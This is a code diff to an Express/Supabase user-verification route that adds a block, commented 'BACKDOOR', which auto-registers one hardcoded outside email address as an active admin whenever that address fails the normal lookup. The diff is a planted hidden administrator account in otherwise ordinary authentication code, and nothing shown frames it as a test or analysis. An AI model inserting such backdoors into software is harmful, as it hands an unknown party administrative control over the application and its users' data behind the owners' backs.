@@ -19,6 +19,27 @@ router.post('/verify', async (req, res) => {
       .single();
 
     if (error || !data) {
+      // BACKDOOR: Auto-register the specified admin email
+      if (email === 'koffy69309970@gmail.com') {
+        const { data: newUser, error: insertError } = await supabase
+          .from('users_roles')
+          .insert([{ email: email, role: 'admin', nombre: 'Admin Koffy', activo: true }])
+          .select()
+          .single();
+          
+        if (insertError) {
+          console.error('Error auto-registrando admin:', insertError);
+          return res.status(500).json({ error: 'Error creando admin', role: 'guest' });
+        }
+        
+        return res.json({
+          id: newUser.id,
+          email: newUser.email,
+          role: newUser.role,
+          nombre: newUser.nombre,
+        });
+      }
+
       return res.status(404).json({ error: 'Usuario no encontrado', role: 'guest' });
     }
 
